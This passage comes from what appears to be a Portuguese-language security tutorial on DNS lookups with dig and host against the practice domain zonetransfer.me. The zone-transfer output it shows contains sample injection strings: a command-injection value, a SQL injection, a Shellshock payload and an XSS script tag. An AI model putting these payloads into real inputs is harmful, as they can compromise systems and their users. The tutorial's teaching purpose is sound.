1 asfdbbox.zonetransfer.me.
127.0.0.1
1 asfdbbox.zonetransfer.me.
202.14.81.230
"; ls"
"Remember to call or email Pippa on +44 123 4567890 or pippa@zonetransfer.me when making DNS changes"
143.228.181.132
dead:beaf::
53 20 56.558 N 1 38 33.526 W 0.00m 1m 10000m 10m
"AbCdEfG"
1 1 "P" "E2U+email" "" email.zonetransfer.me.zonetransfer.me.
74.125.206.26
127.0.0.1
"ZoneTransfer.me service provided by Robin Wood - robin@digi.ninja. See http://digi.ninja/projects/zonetransferme.php for more information."
intns1.zonetransfer.me.
intns2.zonetransfer.me.
81.4.108.41
52.91.28.78
4.23.39.254
2001:67c:2e8:11::c100:1332
207.46.197.32
"Robin Wood"
robin.zonetransfer.me. robinwood.zonetransfer.me.
2 3 "P" "E2U+sip" "!^.*$!sip:customer-service@zonetransfer.me!" .
"' or 1=1 --"
"() { :]}; echo ShellShocked"
www.sydneyoperahouse.com.
127.0.0.1
www.zonetransfer.me.
174.36.59.154
217.147.177.157
"'><script>alert('Boo')</script>"
nsztm1.digi.ninja. robin.digi.ninja. 2017103001 172800 900 1209600 3600
	[-] Testando NameServer nsztm1.digi.ninja. do dominio zonetransfer.me
nsztm1.digi.ninja. robin.digi.ninja. 2017042001 172800 900 1209600 3600
"Casio fx-700G" "Windows XP"
"google-site-verification=tyP28J7JAUHA9fw2sHXMgcCC0I6XBmmoVi04VlMewxA"
0 ASPMX.L.GOOGLE.COM.
10 ALT1.ASPMX.L.GOOGLE.COM.
10 ALT2.ASPMX.L.GOOGLE.COM.
20 ASPMX2.GOOGLEMAIL.COM.
20 ASPMX3.GOOGLEMAIL.COM.
20 ASPMX4.GOOGLEMAIL.COM.
20 ASPMX5.GOOGLEMAIL.COM.
5.196.105.14
nsztm1.digi.ninja.
nsztm2.digi.ninja.
0 0 5060 www.zonetransfer.me.
www.zonetransfer.me.
1 asfdbbox.zonetransfer.me.
127.0.0.1
1 asfdbbox.zonetransfer.me.
202.14.81.230
"; ls"
"Remember to call or email Pippa on +44 123 4567890 or pippa@zonetransfer.me when making DNS changes"
143.228.181.132
dead:beaf::
53 20 56.558 N 1 38 33.526 W 0.00m 1m 10000m 10m
"AbCdEfG"
1 1 "P" "E2U+email" "" email.zonetransfer.me.zonetransfer.me.
74.125.206.26
127.0.0.1
"ZoneTransfer.me service provided by Robin Wood - robin@digi.ninja. See http://digi.ninja/projects/zonetransferme.php for more information."
intns1.zonetransfer.me.
intns2.zonetransfer.me.
81.4.108.41
167.88.42.94
4.23.39.254
2001:67c:2e8:11::c100:1332
207.46.197.32
"Robin Wood"
robin.zonetransfer.me. robinwood.zonetransfer.me.
2 3 "P" "E2U+sip" "!^.*$!sip:customer-service@zonetransfer.me!" .
"' or 1=1 --"
"() { :]}; echo ShellShocked"
www.sydneyoperahouse.com.
127.0.0.1
www.zonetransfer.me.
174.36.59.154
5.196.105.14
"'><script>alert('Boo')</script>"
nsztm1.digi.ninja. robin.digi.ninja. 2017042001 172800 900 1209600 3600
```

Super Cooll HUH?

Iremos entrar mais no assunto de DNS e utilização do DIG conforme o curso avançar.

#### Host
O Host é outra ferramenta utilizada para resolução de Dominio, bem interessante também, existem várias outras mas vou focar nas duas principais. 

A sintaxe do **host** é um pouco diferente do dig, veja só:

```
host {name} [server]
```

Então caso vocẽ queira requistar resolver um nome simplesmente digite:
```
host zonetransfer.me
zonetransfer.me has address 5.196.105.14
zonetransfer.me mail is handled by 20 aspmx2.googlemail.com.
zonetransfer.me mail is handled by 20 aspmx3.googlemail.com.
zonetransfer.me mail is handled by 20 aspmx4.googlemail.com.
zonetransfer.me mail is handled by 20 aspmx5.googlemail.com.
zonetransfer.me mail is handled by 0 aspmx.l.google.com.
zonetransfer.me mail is handled by 10 alt1.aspmx.l.google.com.
zonetransfer.me mail is handled by 10 alt2.aspmx.l.google.com.
``` 

Como você pode observar, ele já trouxe várias informações sobre o dominio requisitado. 

Você pode também fazer a requisição para um servidor de DNS especifico da seguinte forma: 

```
$ host zonetransfer.me 1.1.1.1
Using domain server:
Name: 1.1.1.1
Address: 1.1.1.1#53
Aliases: 

zonetransfer.me has address 5.196.105.14
zonetransfer.me mail is handled by 10 alt2.aspmx.l.google.com.
zonetransfer.me mail is handled by 20 aspmx2.googlemail.com.
zonetransfer.me mail is handled by 20 aspmx3.googlemail.com.
zonetransfer.me mail is handled by 20 aspmx4.googlemail.com.
zonetransfer.me mail is handled by 20 aspmx5.googlemail.com.
zonetransfer.me mail is handled by 0 aspmx.l.google.com.
zonetransfer.me mail is handled by 10 alt1.aspmx.l.google.com.
operador@remember:~/scripts/shellscript/zonetransfer$ 
```

Bom, os tópicos desse paper foram todos abordados, espero que você tenha aproveitado!



#### Fontes
https://www.hackingtutorials.org/networking/hacking-with-netcat-part-1-the-basics/
https://www.hackingtutorials.org/networking/hacking-with-netcat-part-3-advanced-techniques/
https://null-byte.wonderhowto.com/how-to/hack-like-pro-use-netcat-swiss-army-knife-hacking-tools-0148657/
https://osric.com/chris/accidental-developer/2018/01/using-nc-netcat-to-make-an-http-request/
https://www.g-loaded.eu/2006/11/06/netcat-a-couple-of-useful-examples/
http://notes.rioastamal.net/2014/02/faking-services-using-netcat-for-nagios-testing.html
